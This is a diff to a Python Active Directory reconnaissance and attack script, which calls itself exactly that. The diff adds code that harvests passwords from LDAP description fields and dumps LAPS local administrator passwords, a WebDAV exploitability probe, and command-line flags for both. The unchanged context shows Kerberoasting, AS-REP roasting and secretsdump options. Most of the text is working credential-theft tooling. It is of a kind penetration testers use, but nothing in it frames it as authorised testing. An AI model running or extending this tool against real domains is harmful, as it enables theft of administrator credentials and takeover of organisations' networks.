@@ -3,6 +3,8 @@ import logging
 from ldap3 import Server, Connection, ALL, NTLM, ANONYMOUS
 from impacket.smbconnection import SMBConnection
 import subprocess
+import re
+import requests
 
 # Set up logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
@@ -31,8 +33,8 @@ def enumerate_ldap_objects(conn, search_base):
 
     queries = {
         'Domain Information': {'filter': '(objectClass=domain)', 'attributes': ['*']},
-        'Users': {'filter': '(objectClass=user)', 'attributes': ['sAMAccountName', 'displayName', 'memberOf', 'userAccountControl']},
-        'Groups': {'filter': '(objectClass=group)', 'attributes': ['cn', 'member', 'groupType']},
+        'Users': {'filter': '(objectClass=user)', 'attributes': ['sAMAccountName', 'displayName', 'description', 'memberOf', 'userAccountControl']},
+        'Groups': {'filter': '(objectClass=group)', 'attributes': ['cn', 'description', 'member', 'groupType']},
         'Computers': {'filter': '(objectClass=computer)', 'attributes': ['cn', 'operatingSystem', 'operatingSystemVersion', 'dNSHostName']},
         'Domain Admins': {'filter': f'(&(objectCategory=person)(objectClass=user)(memberOf=cn=Domain Admins,cn=Users,{search_base}))', 'attributes': ['sAMAccountName', 'displayName', 'memberOf']}
     }
@@ -43,8 +45,18 @@ def enumerate_ldap_objects(conn, search_base):
             logging.info(f"\n[+] {key}:")
             for entry in conn.entries:
                 logging.info(entry)
+                if 'description' in entry and entry.description:
+                    check_description_for_password(entry)
         except Exception as e:
             logging.error(f"Error enumerating {key}: {e}")
+
+def check_description_for_password(entry):
+    """Check descriptions for potential passwords."""
+    password_patterns = re.compile(r'password\s*[:=]\s*(\S+)', re.IGNORECASE)
+    description = entry.description.value
+    matches = password_patterns.findall(description)
+    if matches:
+        logging.warning(f"Potential password found in description of {entry.entry_dn}: {matches}")
 
 def enumerate_netbios_and_smb(server_address, username=None, password=None, domain=None):
     logging.info("Enumerating NetBIOS and SMB shares...")
@@ -103,10 +115,6 @@ def enumerate_sysvol_gpo_scripts(smb_conn):
         sysvol_path = '\\\\' + smb_conn.getRemoteHost() + '\\SYSVOL'
         smb_conn.listPath(sysvol_path, '*')
 
-        # GPO scripts are usually located under:
-        # \\<domain>\SYSVOL\<domain>\Policies\<GPO>\Machine\Scripts\Startup
-        # \\<domain>\SYSVOL\<domain>\Policies\<GPO>\User\Scripts\Logon
-
         gpo_path = sysvol_path + '\\Policies'
         gpo_files = smb_conn.listPath(gpo_path, '*')
 
@@ -162,6 +170,41 @@ def dump_secrets(server_address, username, password, domain):
     if result:
         logging.info(result)
 
+def dump_laps_passwords(conn, search_base):
+    logging.info("\n[+] Dumping LAPS Passwords...")
+    try:
+        conn.search(
+            search_base=search_base,
+            search_filter='(&(objectClass=computer)(ms-MCS-AdmPwd=*))',
+            attributes=['sAMAccountName', 'ms-MCS-AdmPwd', 'ms-MCS-AdmPwdExpirationTime']
+        )
+        if conn.entries:
+            logging.info("[+] LAPS Passwords:")
+            for entry in conn.entries:
+                logging.info(f"Computer: {entry.sAMAccountName}, Password: {entry['ms-MCS-AdmPwd']}, Expiration: {entry['ms-MCS-AdmPwdExpirationTime']}")
+        else:
+            logging.info("No LAPS passwords found or insufficient permissions.")
+    except Exception as e:
+        logging.error(f"Error dumping LAPS passwords: {e}")
+
+def check_webdav_exploitability(server_address):
+    logging.info("\n[+] Checking WebDAV Exploitability...")
+    try:
+        url = f"http://{server_address}/"
+        response = requests.options(url)
+        
+        if 'DAV' in response.headers.get('allow', ''):
+            logging.info(f"WebDAV is enabled on {server_address}")
+            if 'PROPFIND' in response.headers.get('allow', '') and 'MKCOL' in response.headers.get('allow', ''):
+                logging.warning("WebDAV is potentially exploitable! PROPFIND and MKCOL are allowed.")
+            else:
+                logging.info("WebDAV is enabled but may not be fully exploitable.")
+        else:
+            logging.info("WebDAV is not enabled on the server.")
+
+    except Exception as e:
+        logging.error(f"Error checking WebDAV exploitability: {e}")
+
 def main():
     parser = argparse.ArgumentParser(description="Comprehensive Active Directory Reconnaissance and Attack Script")
     parser.add_argument('--server', required=True, help='LDAP/DC server address')
@@ -171,6 +214,8 @@ def main():
     parser.add_argument('--kerberoast', action='store_true', help='Perform Kerberoasting')
     parser.add_argument('--asrep', help='Perform AS-REP Roasting with specified user file')
     parser.add_argument('--dump', action='store_true', help='Dump secrets using secretsdump')
+    parser.add_argument('--laps', action='store_true', help='Dump LAPS passwords')
+    parser.add_argument('--webdav', action='store_true', help='Check WebDAV exploitability')
     args = parser.parse_args()
 
     if args.username and not args.password:
@@ -183,6 +228,11 @@ def main():
     # Connect to AD and perform LDAP enumeration
     conn = connect_to_ad(args.server, args.domain, args.username, args.password)
     enumerate_ldap_objects(conn, search_base)
+
+    # Dump LAPS passwords if specified
+    if args.laps:
+        dump_laps_passwords(conn, search_base)
+
     conn.unbind()
 
     # Enumerate NetBIOS and SMB shares
@@ -199,6 +249,10 @@ def main():
     # Dump secrets if specified
     if args.dump:
         dump_secrets(args.server, args.username, args.password, args.domain)
+
+    # Check WebDAV exploitability if specified
+    if args.webdav:
+        check_webdav_exploitability(args.server)
 
 if __name__ == "__main__":
     main()
